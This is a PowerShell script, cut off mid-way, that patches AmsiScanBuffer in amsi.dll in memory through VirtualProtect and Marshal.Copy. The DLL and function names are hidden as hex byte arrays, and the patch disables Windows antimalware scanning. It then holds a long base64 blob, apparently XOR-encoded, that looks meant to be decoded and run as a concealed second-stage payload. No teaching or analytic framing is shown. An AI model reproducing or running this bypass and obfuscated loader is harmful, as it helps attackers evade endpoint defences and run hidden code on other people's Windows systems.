
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

$enc = [system.Text.Encoding]::UTF8


$EncodedText = "d2R/cmV4fn8xWH9nfnp0PEV5dFlwYnkbahstMhs/QkhfXkFCWEIbWH9nfnp0PEV5dFlwYnkxeXBiMWV5dDFwc3h9eGVoMWV+MWVwY3Z0ZTF8ZH1leGF9dDF5fmJlYjFmeGV5MVh/Z356dDxCXFNUaXRyMX5jMVh/Z356dDxGXFhUaXRyPzFFeXhiMXdkf3JleH5/MXhiG2FjeHxwY3h9aDF3fmMxcnl0cnp4f3YxcDF5cGJ5MXB2cHh/YmUxfGR9ZXhhfXQxYmhiZXR8Yj8xRXl0MXdkf3JleH5/MXJwfzFwfWJ+MXN0MWRidHUxZX4xYXRjd35jfDF+ZXl0YzFlcGJ6YhtwdnB4f2JlMXxkfWV4YX10MXl+YmViPzEbG1BkZXl+YysxWnRneH8xQ35zdGNlYn5/MTlRenRneH9OY35zdGNlYn5/ODExG114cnR/YnQrMVNCVTEiPFJ9cGRidDEbGz9BUENQXFRFVEMxRWhhdBs5QlxTUn14dH9lPkJcU1R/ZHw+QlxTVGl0cj5GXFhUaXRyODFCdGViMWV5dDF1dGJ4Y3R1MVh/Z356dDxFeXRZcGJ5MXdkf3JleH5/PxsbP0FQQ1BcVEVUQzFFcGN2dGUbXXhiZTF+dzF5fmJlf3B8dGI9MVhBMXB1dWN0YmJ0Yj0xUlhVQzF/fmVwZXh+fz0xfmMxWEExY3B/dnRiMXd+YzFlcGN2dGViPxsbP0FQQ1BcVEVUQzFFcGN2dGVUaXJ9ZHV0G114YmUxfncxeX5iZX9wfHRiPTFYQTFwdXVjdGJidGI9MVJYVUMxf35lcGV4fn89MX5jMVhBMWNwf3Z0YjFlfjF0aXJ9ZHV0MXd+Y3wxZXl0MX14YmUxfmMxZXBjdnRlYj8xX35ldDFleXBlMWV5dBt3fmN8cGUxOXl+YmV/cHx0MWdiMVhBMXB1dWN0YmI4MXxkYmUxfHBlcnkxZXl0MXd+Y3xwZTFkYnR1MWZ4ZXkxZXl0MUVwY3Z0ZWIxYXBjcHx0ZXRjPzFXfmMxdGlwfGF9dD0xeHcxZXl0MXl+YmUbZnBiMXB1dXR1MWV+MUVwY3Z0ZWIxZnhleXh/MXAxUlhVQzF/fmVwZXh+fz0xeGUxfGRiZTFzdDF0aXJ9ZHV0dTFwYjFwfzFYQTFwdXVjdGJiMXB/dTF/fmUxcDF5fmJlMX9wfHQ/Gxs/QVBDUFxURVRDMUF+Y2VSeXRyelV4YnBzfXQbOUJmeGVyeTgxVXhicHN9dDFGXFgxfmMxQlxTMWF+Y2Uxcnl0cno/MUJ4f3J0MWV5eGIxd2R/cmV4fn8xeGIxf35lMWh0ZTFleWN0cHV0dT0xZXl0MWF+Y2Uxcnl0cnoxYnRjZ3RiMWV+MWJhdHR1MWRhG2V5dDF3ZH9yZXh+fzFzaDFyeXRyenh/djF3fmMxcH8xfmF0fzFGXFgxfmMxQlxTMWF+Y2Uxc3R3fmN0MXBlZXR8YWV4f3YxcDF3ZH19MWJof3J5Y35/fmRiMUVSQVJ9eHR/ZTFyfn9/dHJleH5/PxsbP0FQQ1BcVEVUQzFBfmNlUnl0cnpFeHx0fmRlG1V0d3BkfWUxLDEgISErMUJ0ZTFleXQxf34xY3RiYX5/YnQxZXh8dH5kZTF4fzF8eH19eGJ0cn5/dWIxd35jMWV5dDFGXFgxfmMxQlxTMWF+Y2Uxcnl0cno/Gxs/QVBDUFxURVRDMURidGN/cHx0G0RidGN/cHx0MWV+MWRidDF3fmMxcGRleXR/ZXhycGV4fn8/Gxs/QVBDUFxURVRDMVV+fHB4fxtVfnxweH8xZX4xZGJ0MXd+YzFwZGV5dH9leHJwZXh+fz8xRXl4YjFhcGNwfHRldGMxeGIxf35lMX90dHV0dTFmeGV5MX1+cnB9MXBycn5kf2ViMX5jMWZ5dH8xZGJ4f3YxUXV+fHB4fzFwd2V0YzFleXQxZGJ0Y39wfHQ/MRsbP0FQQ1BcVEVUQzFZcGJ5G19FXVwxYXBiYmZ+Y3UxeXBieTF3fmMxcGRleXR/ZXhycGV4fn8/MUV5eGIxfH51ZH10MWZ4fX0xcHJydGFlMXR4ZXl0YzFdXCtfRV1cMX5jMV9FXVwxd35jfHBlPxsbP0FQQ1BcVEVUQzFSfnx8cH91G1J+fHxwf3UxZX4xdGl0cmRldDF+fzFleXQxZXBjdnRlPzFYdzFwMXJ+fHxwf3UxeGIxf35lMWJhdHJ4d3h0dT0xZXl0MXdkf3JleH5/MWZ4fX0xe2RiZTFyeXRyejFlfjFidHQxeHcxZXl0MWRidGN/cHx0MXB/dTF5cGJ5MXlwYjFwcnJ0YmIxZX4xRlxYMX5/MWV5dDFlcGN2dGU/Gxs/QVBDUFxURVRDMVJ+fHxwf3VSXlxCQVRSG1V0d3BkfWUxLDFUf3BzfXR1KzFCXFNUaXRyMWVoYXQxfn99aD8xQWN0YXR/dTE0Ul5cQkFUUjQxPlIxZX4xUn58fHB/dT8bGz9BUENQXFRFVEMxUHJleH5/GzlQfX09VmN+ZGE9X3RlQnRiYnh+fz1CeXBjdD1EYnRjODFVdHdwZH1lMSwxQnlwY3QrMUJcU1R/ZHwxdH9kfHRjcGV4fn8xcHJleH5/MWV+MWF0Y3d+Y3w/Gxs/QVBDUFxURVRDMVZjfmRhG1V0d3BkfWUxLDFQdXx4f3hiZWNwZX5jYisxVmN+ZGExZX4xdH9kfHRjcGV0MWZ4ZXkxQlxTVH9kfD8bGz9BUENQXFRFVEMxQnRjZ3hydBtVdHdwZH1lMSwxIyExUnlwY3ByZXRjMUNwf3V+fCsxQlxTVGl0cjFlaGF0MX5/fWg/MV9wfHQxfncxZXl0MWJ0Y2d4cnQxZX4xcmN0cGV0MXB/dTF1dH10ZXQxfn8xZXl0MWVwY3Z0ZT8bGz9BUENQXFRFVEMxQn10dGEbVXR3cGR9ZTEsMUZcWDEgITFceH19eGJ0cn5/dWI9MUJcUzEgJCExXHh9fXhidHJ+f3ViKzFCdGViMWV5dDF3ZH9yZXh+fzZiMUJlcGNlPEJ9dHRhMWdwfWR0YjF4fzF8eH19eGJ0cn5/dWI/MUh+ZDFycH8xZWNoMWVmdHB6eH92MWV5eGIbYnRlZXh/djF4dzFofmQxcGN0MXRpYXRjeHR/cnh/djFiZWNwf3Z0MWN0YmR9ZWI/Gxs/VElQXEFdVBtYf2d+enQ8RXl0WXBieTE8RWhhdDFGXFhUaXRyMTxFcGN2dGUxICgjPyAnKT8gISE/IT4jJTE8RXBjdnRlVGlyfWR1dDEgKCM/ICcpPyAhIT8kITE8RGJ0Y39wfHQxcHV8eH94YmVjcGV+YzE8WXBieTFXJ1ciKVMmKCJVUydQKCVTUCElUCQjVyBVIlRUKCNXIRsbP1RJUFxBXVQbWH9nfnp0PEV5dFlwYnkxPEVoYXQxQlxTVGl0cjE8RXBjdnRlMSAoIz8gJyk/ICEhPyA8ICEhMTxFcGN2dGVUaXJ9ZHV0MSAoIz8gJyk/ICEhPyQhMTxEYnRjf3B8dDFkYnRjIDE8WXBieTFXJ1ciKVMmKCJVUydQKCVTUCElUCQjVyBVIlRUKCNXITE8dX58cHh/MWV0YmUbGz9dWF9aG3llZWFiKz4+dnhleWRzP3J+fD5adGd4fzxDfnN0Y2Vifn8+WH9nfnp0PEV5dFlwYnkbGzIvG0pSfHV9dGVTeH91eH92OVV0d3BkfWVBcGNwfHRldGNidGVfcHx0LDZVdHdwZH1lNjhMG2FwY3B8GzkbMTExMUphcGNwfHRldGM5XHB/dXBlfmNoLDVlY2R0OExKUGNjcGhMNUVwY3Z0ZT0bMTExMUphcGNwfHRldGM5XHB/dXBlfmNoLDV3cH1idDhMSlBjY3BoTDVFcGN2dGVUaXJ9ZHV0PRsxMTExSmFwY3B8dGV0YzlBcGNwfHRldGNCdGVfcHx0LDZQZGV5Nj1ccH91cGV+Y2gsNWVjZHQ4TEpCZWN4f3ZMNURidGN/cHx0PRsxMTExSmFwY3B8dGV0YzlBcGNwfHRldGNCdGVfcHx0LDZQZGV5Nj1ccH91cGV+Y2gsNXdwfWJ0OExKQmVjeH92TDVVfnxweH89GzExMTFKYXBjcHx0ZXRjOVxwf3VwZX5jaCw1d3B9YnQ4TEpHcH14dXBldEJ0ZTkzUH19Mz0zX3RlQnRiYnh+fzM9M0J5cGN0Mz0zRGJ0YzM9M1ZjfmRhMzhMSkJlY3h/dkw1UHJleH5/MSwxM1B9fTM9GzExMTFKYXBjcHx0ZXRjOVxwf3VwZX5jaCw1d3B9YnQ4TEpCZWN4f3ZMNVZjfmRhMSwxM1B1fHh/eGJlY3BlfmNiMz0bMTExMUphcGNwfHRldGM5XHB/dXBlfmNoLDV3cH1idDhMSkJlY3h/dkw1QnRjZ3hydD0bMTExMUphcGNwfHRldGM5XHB/dXBlfmNoLDV3cH1idDhMSkJlY3h/dkw1Un58fHB/dT0bMTExMUphcGNwfHRldGM5XHB/dXBlfmNoLDV3cH1idDhMSkdwfXh1cGV0QnRlOTNIMz0zXzM4TEpCZWN4f3ZMNVJ+fHxwf3VSXlxCQVRSLDNIMz0bMTExMUphcGNwfHRldGM5XHB/dXBlfmNoLDVlY2R0OExKR3B9eHVwZXRCdGU5M0JcU1J9eHR/ZTM9M0JcU1R/ZHwzPTNCXFNUaXRyMz0zRlxYVGl0cjM4TEpCZWN4f3ZMNUVoYXQ9GzExMTFKYXBjcHx0ZXRjOVxwf3VwZX5jaCw1d3B9YnQ4TEpYf2VMNUF+Y2VSeXRyekV4fHR+ZGUxLDEgISE9GzExMTFKYXBjcHx0ZXRjOUFwY3B8dGV0Y0J0ZV9wfHQsNlBkZXk2PVxwf3VwZX5jaCw1ZWNkdDhMSkdwfXh1cGV0QnJjeGFlOWo1Tj9ddH92ZXkxPHRgMSIjMTx+YzE1Tj9ddH92ZXkxPHRgMSckbDhMSkJlY3h/dkw1WXBieT0bMTExMUphcGNwfHRldGM5XHB/dXBlfmNoLDV3cH1idDhMSkJmeGVyeUw1QX5jZVJ5dHJ6VXhicHN9dD0bMTExMUphcGNwfHRldGM5XHB/dXBlfmNoLDV3cH1idDhMSlh/ZUw1Qn10dGEbOBsbNWVwY3Z0ZU59eGJlMSwxX3RmPF5ze3RyZTFCaGJldHw/Un59fXRyZXh+f2I/UGNjcGhdeGJlGzVlcGN2dGVOdGlyfWR1dE59eGJlMSwxX3RmPF5ze3RyZTFCaGJldHw/Un59fXRyZXh+f2I/UGNjcGhdeGJlGxt4dzk1RWhhdDE8dGAxNkZcWFRpdHI2OBtqGzExMTE1Qn10dGExLDEgIRtsG3R9YnQbahsxMTExNUJ9dHRhMSwxICQhG2wbG3d+Yzk1eCwhKjV4MTx9ZTE1ZXBjdnRlP1J+ZH9lKjV4Ojo4G2obGzExMTF4dzk1ZXBjdnRlSjV4TDE8fXh6dDEzOzw7MzgbMTExMWobMTExMTExMTE1ZXBjdnRlTnBjY3BoMSwxNWVwY3Z0ZUo1eEw/YmF9eGU5MzwzOBsbMTExMTExMTF4dzk1ZXBjdnRlTnBjY3BoSiFMMTx8cGVyeTEzTXM5Lis5LisjJEohPCRMbSNKITwlTEohPChMbUohIEwuSiE8KExKITwoTC44TT84aiJsOS4rIyRKITwkTG0jSiE8JUxKITwoTG1KISBMLkohPChMSiE8KEwuOE1zMzE8cH91GzExMTExMTExNWVwY3Z0ZU5wY2NwaEogTDE8f35lfHBlcnkxM01zOS4rOS4rIyRKITwkTG0jSiE8JUxKITwoTG1KISBMLkohPChMSiE8KEwuOE0/OGoibDkuKyMkSiE8JExtI0ohPCVMSiE8KExtSiEgTC5KITwoTEohPChMLjhNczM4GzExMTExMTExahsbMTExMTExMTExMTExeHc5NWVwY3Z0ZU5wY2NwaD9SfmR/ZTE8f3QxIzE8fmMxNWVwY3Z0ZU5wY2NwaEogTDE8f35lfHBl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MTExMWobMTExMTExMTE1ZXBjdnRlTn14YmU/Q3R8fmd0OTV/dGVmfmN6TnB1dWN0YmI/WEFQdXVjdGJiRX5CZWN4f3Y4GzExMTFsGxsxMTExeHc5NXNjfnB1cnBiZU5wdXVjdGJiOBsxMTExahsxMTExMTExMTVlcGN2dGVOfXhiZT9DdHx+Z3Q5NXNjfnB1cnBiZU5wdXVjdGJiP1hBUHV1Y3RiYkV+QmVjeH92OBsxMTExbBsxMTExGzExMTFjdGVkY38xNWVwY3Z0ZU59eGJlG2wbG3dkf3JleH5/MVZ0ZTxFcGN2dGVdeGJlG2obMTExMWFwY3B8OTVlcGN2dGViOBsbMTExMTVlcGN2dGVOfXhiZTEsMV90Zjxec3t0cmUxQmhiZXR8P1J+fX10cmV4fn9iP1BjY3BoXXhiZRsbMTExMVd+Y1Rwcnk5NXR/ZWNoMXh/MTVlcGN2dGViOBsxMTExahsxMTExMTExMTV0f2VjaE5iYX14ZTEsMTV/ZH19GxsxMTExMTExMXh3OTV0f2VjaD9yfn9lcHh/YjkzPjM4OBsxMTExMTExMWobMTExMTExMTExMTExNXR/ZWNoTmJhfXhlMSwxNXR/ZWNoP0JhfXhlOTM+MzgbMTExMTExMTExMTExNVhBMSwxNXR/ZWNoTmJhfXhlSiFMGzExMTExMTExMTExMTVSWFVDMSwxNXR/ZWNoTmJhfXhlSiBMGzExMTExMTExMTExMTVlcGN2dGVOfXhiZT9QdXVDcH92dDk1OVJ+f2d0Y2U8Q3B/dnRlflhBXXhiZTE8WEExNVhBMTxSWFVDMTVSWFVDODgbMTExMTExMTFsGzExMTExMTExdH1idHh3OTV0f2VjaD9yfn9lcHh/YjkzPDM4OBsxMTExMTExMWobMTExMTExMTExMTExNXR/ZWNoTmJhfXhlMSwxNXR/ZWNoP0JhfXhlOTM8MzgbGzExMTExMTExMTExMXh3OTV0f2VjaE5iYX14ZUohTDE8fHBlcnkxM01zOS4rOS4rIyRKITwkTG0jSiE8JUxKITwoTG1KISBMLkohPChMSiE8KEwuOE0/OGoibDkuKyMkSiE8JExtI0ohPCVMSiE8KExtSiEgTC5KITwoTEohPChMLjhNczMxPHB/dRsxMTExMTExMTExMTE1dH9lY2hOYmF9eGVKIEwxPHxwZXJ5MTNNczkuKzkuKyMkSiE8JExtI0ohPCVMSiE8KExtSiEgTC5KITwoTEohPChMLjhNPzhqImw5LisjJEohPCRMbSNKITwlTEohPChMbUohIEwuSiE8KExKITwoTC44TXMzOBsxMTExMTExMTExMTFqGzExMTExMTExMTExMTExMTE1YmVwY2VOcHV1Y3RiYjEsMTV0f2VjaE5iYX14ZUohTBsxMTExMTExMTExMTExMTExNXR/dU5wdXVjdGJiMSwxNXR/ZWNoTmJhfXhlSiBMGzExMTExMTExMTExMTExMTE1ZXBjdnRlTn14YmU/UHV1Q3B/dnQ5NTlSfn9ndGNlPENwf3Z0ZX5YQV14YmUxPEJlcGNlMTViZXBjZU5wdXVjdGJiMTxUf3UxNXR/dU5wdXVjdGJiODgbMTExMTExMTExMTExbBsxMTExMTExMTExMTF0fWJ0GzExMTExMTExMTExMWobMTExMTExMTExMTExMTExMTVlcGN2dGVOfXhiZT9QdXU5NXR/ZWNoODEvMTV/ZH19MTExMRsxMTExMTExMTExMTFsGzExMTExMTExMTExMRsxMTExMTExMWwbMTExMTExMTF0fWJ0GzExMTExMTExahsxMTExMTExMTExMTE1ZXBjdnRlTn14YmU/UHV1OTV0f2VjaDgxLzE1f2R9fRsxMTExMTExMWwbGzExMTFsGxsxMTExY3RlZGN/MTVlcGN2dGVOfXhiZRtsGxtKUGNjcGhMNWVwY3Z0ZU59eGJlMSwxVnRlPEVwY3Z0ZV14YmUxNUVwY3Z0ZRsbeHc5NUVwY3Z0ZVRpcn1kdXQ4G2obMTExMTVlcGN2dGVOdGlyfWR1dE59eGJlMSwxVnRlPEVwY3Z0ZV14YmUxNUVwY3Z0ZVRpcn1kdXQbMTExMTVlcGN2dGVOfXhiZTEsMVJ+fGFwY3Q8XnN7dHJlMTxDdHd0Y3R/cnRec3t0cmUxNWVwY3Z0ZU50aXJ9ZHV0Tn14YmUxPFV4d3d0Y3R/cnRec3t0cmUxNWVwY3Z0ZU59eGJlMTxBcGJiRXljZBtsGxt4dzk1ZXBjdnRlTn14YmU/Un5kf2UxPHZlMSE4G2obGzExMTF3fmN0cHJ5OTVlcGN2dGVOeX5iZTF4fzE1ZXBjdnRlTn14YmU4GzExMTFqGzExMTExMTExRmN4ZXQ8R3Rjc35idDEzSjtMMUVwY3Z0ZXh/djE1ZXBjdnRlTnl+YmUzGxsxMTExMTExMXh3OTVlaGF0MTx0YDE2RlxYVGl0cjY4GzExMTExMTExahsbMTExMTExMTExMTExeHc5MDVBfmNlUnl0cnpVeGJwc310OBsxMTExMTExMTExMTFqGzExMTExMTExMTExMTExMTE1RlxYTmF+Y2VOZXRiZTEsMV90Zjxec3t0cmUxQmhiZXR8P190ZT9CfnJ6dGViP0VSQVJ9eHR/ZRsxMTExMTExMTExMTExMTExNUZcWE5hfmNlTmV0YmVOY3RiZH1lMSwxNUZcWE5hfmNlTmV0YmU/U3R2eH9Sfn9/dHJlOTVlcGN2dGVOeX5iZT0zICIkMz01f2R9fT01f2R9fTgbMTExMTExMTExMTExMTExMTVGXFhOYX5jZU5ldGJlTmJkcnJ0YmIxLDE1RlxYTmF+Y2VOZXRiZU5jdGJkfWU/UGJof3JGcHhlWXB/dX10P0ZweGVef3Q5NUF+Y2VSeXRyekV4fHR+ZGU9NXdwfWJ0OBsxMTExMTExMTExMTExMTExNUZcWE5hfmNlTmV0YmU/Un1+YnQ5OBsxMTExMTExMTExMTFsGxsxMTExMTExMTExMTF4dzk1RlxYTmF+Y2VOZXRiZU5iZHJydGJiMTx+YzE1QX5jZVJ5dHJ6VXhicHN9dDgbMTExMTExMTExMTExahsxMTExMTExMTExMTExMTExWH9nfnp0PEZcWFRpdHIxPGRidGN/cHx0MTVEYnRjf3B8dDE8dX58cHh/MTVVfnxweH8xPHlwYnkxNVlwYnkxPHJ+fHxwf3UxNVJ+fHxwf3UxPGVwY3Z0ZTE1ZXBjdnRlTnl+YmUxPGJ9dHRhMTVCfXR0YTE8R3Rjc35idCs1R3Rjc35idEFjdHd0Y3R/cnQbMTExMTExMTExMTExbBsbMTExMTExMTFsGzExMTExMTExdH1idHh3OTVFaGF0MTx9eHp0MTZCXFM7NjgbMTExMTExMTFqGxsxMTExMTExMTExMTF4dzkwNUF+Y2VSeXRyelV4YnBzfXQ4GzExMTExMTExMTExMWobMTExMTExMTExMTExMTExMTVCXFNOYX5jZU5ldGJlMSwxX3RmPF5ze3RyZTFCaGJldHw/X3RlP0J+cnp0ZWI/RVJBUn14dH9lGzExMTExMTExMTExMTExMTE1QlxTTmF+Y2VOZXRiZU5jdGJkfWUxLDE1QlxTTmF+Y2VOZXRiZT9TdHZ4f1J+f390cmU5NWVwY3Z0ZU55fmJlPTMlJSQzPTV/ZH19PTV/ZH19OBsxMTExMTExMTExMTExMTExNUJcU05hfmNlTmV0YmVOYmRycnRiYjEsMTVCXFNOYX5jZU5ldGJlTmN0YmR9ZT9QYmh/ckZweGVZcH91fXQ/RnB4ZV5/dDk1QX5jZVJ5dHJ6RXh8dH5kZT01d3B9YnQ4GzExMTExMTExMTExMTExMTE1QlxTTmF+Y2VOZXRiZT9SfX5idDk4GzExMTExMTExMTExMWwbGzExMTExMTExMTExMXh3OTVCXFNOYX5jZU5ldGJlTmJkcnJ0YmIxPH5jMTVBfmNlUnl0cnpVeGJwc310OBsxMTExMTExMTExMTFqGxsxMTExMTExMTExMTExMTExYmZ4ZXJ5OTVFaGF0OBsxMTExMTExMTExMTExMTExahsbMTExMTExMTExMTExMTExMTExMTE2QlxTUn14dH9lNhsxMTExMTExMTExMTExMTExMTExMWobGzExMTExMTExMTExMTExMTExMTExMTExMTVifmRjcnQxLDEzTU0zMToxNWVwY3Z0ZU55fmJlMToxM01yNTMbGzExMTExMTExMTExMTExMTExMTExMTExMXh3OTVBYlJ8dX10ZT9BcGNwfHRldGNCdGVfcHx0MTx0YDE2UGRleTY4GzExMTExMTExMTExMTExMTExMTExMTExMWobMTExMTExMTExMTExMTExMTExMTExMTExMTExMVh/Z356dDxCXFNSfXh0f2UxPGRidGN/cHx0MTVEYnRjf3B8dDE8dX58cHh/MTVVfnxweH8xPHlwYnkxNVlwYnkxPGJ+ZGNydDE1Yn5kY3J0MTxifXR0YTE1Qn10dGExPEd0Y3N+YnQrNUd0Y3N+YnRBY3R3dGN0f3J0GzExMTExMTExMTExMTExMTExMTExMTExMWwbMTExMTExMTExMTExMTExMTExMTExMTExdH1idBsxMTExMTExMTExMTExMTExMTExMTExMTFqGzExMTExMTExMTExMTExMTExMTExMTExMTExMTFYf2d+enQ8QlxTUn14dH9lMTxifmRjcnQxNWJ+ZGNydDE8Yn10dGExNUJ9dHRhMTxHdGNzfmJ0KzVHdGNzfmJ0QWN0d3RjdH9ydBsxMTExMTExMTExMTExMTExMTExMTExMTFsGxsxMTExMTExMTExMTExMTExMTExMWwbGzExMTExMTExMTExMTExMTExMTExNkJcU1R/ZHw2GzExMTExMTExMTExMTExMTExMTExahsbMTExMTExMTExMTExMTExMTExMTExMTExeHc5NUFiUnx1fXRlP0FwY3B8dGV0Y0J0ZV9wfHQxPHRgMTZQZGV5NjgbMTExMTExMTExMTExMTExMTExMTExMTExahsxMTExMTExMTExMTExMTExMTExMTExMTExMTExWH9nfnp0PEJcU1R/ZHwxPGRidGN/cHx0MTVEYnRjf3B8dDE8dX58cHh/MTVVfnxweH8xPHlwYnkxNVlwYnkxPGVwY3Z0ZTE1ZXBj